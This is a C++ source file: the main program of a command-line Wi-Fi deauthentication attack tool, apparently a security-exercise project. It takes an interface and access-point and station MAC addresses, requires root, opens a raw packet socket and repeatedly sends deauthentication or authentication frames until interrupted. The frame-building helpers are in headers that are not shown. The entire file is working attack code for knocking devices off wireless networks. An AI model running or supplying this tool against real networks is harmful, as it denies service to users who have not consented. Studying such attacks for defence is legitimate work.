#include <iostream>
#include <cstring>
#include <cstdlib>
#include <unistd.h>
#include <csignal>
#include <fstream>

#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netpacket/packet.h>
#include <net/ethernet.h> // ETH_P_ALL
#include <arpa/inet.h>

#include "deauth.h"
#include "auth.h"

volatile bool keepRunning = true;

void signalHandler(int signum) {
    std::cout << "\n[!] Caught signal " << signum << ", stopping attack...\n";
    keepRunning = false;
}

// Parse MAC address (aa:bb:cc:dd:ee:ff -> 6 bytes)
bool parseMac(const char* macStr, uint8_t* macArr) {
    int values[6];
    if (sscanf(macStr, "%x:%x:%x:%x:%x:%x",
               &values[0], &values[1], &values[2],
               &values[3], &values[4], &values[5]) == 6) {
        for (int i = 0; i < 6; i++)
            macArr[i] = (uint8_t)values[i];
        return true;
    }
    return false;
}

int main(int argc, char* argv[]) {
    if (argc < 3) {
        std::cerr << "Usage: deauth-attack <interface> <ap mac> [<station mac> [-auth]]\n";
        return -1;
    }

    if (geteuid() != 0) {
        std::cerr << "[-] Error: You must be root to run this program.\n";
        return -1;
    }

    signal(SIGINT, signalHandler); // Handle Ctrl+C

    const char* dev = argv[1];
    uint8_t apMac[6];
    uint8_t stationMac[6] = {0,};

    if (!parseMac(argv[2], apMac)) {
        std::cerr << "[-] Invalid AP MAC address\n";
        return -1;
    }
    std::cout << "[+] AP MAC address: " << argv[2] << std::endl;

    bool hasStation = false;
    bool isAuth = false;

    if (argc >= 4) {
        if (strcmp(argv[3], "-auth") == 0) {
            std::cerr << "[-] Error: Station MAC is required for -auth mode.\n";
            return -1;
        } else {
            hasStation = true;
            if (!parseMac(argv[3], stationMac)) {
                std::cerr << "[-] Invalid Station MAC address\n";
                return -1;
            }
            std::cout << "[+] Station MAC address: " << argv[3] << std::endl;
            if (argc == 5 && strcmp(argv[4], "-auth") == 0) {
                isAuth = true;
            }
        }
    }

    int sock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock < 0) {
        perror("socket");
        return -1;
    }

    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);

    if (ioctl(sock, SIOCGIFINDEX, &ifr) < 0) {
        perror("ioctl(SIOCGIFINDEX)");
        close(sock);
        return -1;
    }

    struct sockaddr_ll addr;
    memset(&addr, 0, sizeof(addr));
    addr.sll_family   = AF_PACKET;
    addr.sll_ifindex  = ifr.ifr_ifindex;
    addr.sll_protocol = htons(ETH_P_ALL);

    if (bind(sock, (struct sockaddr*)&addr, sizeof(addr)) < 0) {
        perror("bind");
        close(sock);
        return -1;
    }

    std::cout << "[+] Using interface: " << dev << "\n";
    std::cout << "[+] Press Ctrl+C to stop the attack\n";

    while (keepRunning) {
        if (isAuth) {
            if (!sendAuthFrame(sock, apMac, stationMac)) {
                std::cerr << "[-] Failed to send Auth frame\n";
            } else {
                std::cout << "[+] Sent Auth frame\n";
            }
        } else {
            if (!sendDeauthFrame(sock, apMac, hasStation ? stationMac : nullptr)) {
                std::cerr << "[-] Failed to send Deauth frame\n";
            } else {
                std::cout << "[+] Sent Deauth frame\n";
            }
        }
        sleep(1); // Avoid excessive packets
    }

    std::cout << "[+] Cleaning up and exiting...\n";
    close(sock);
    return 0;
}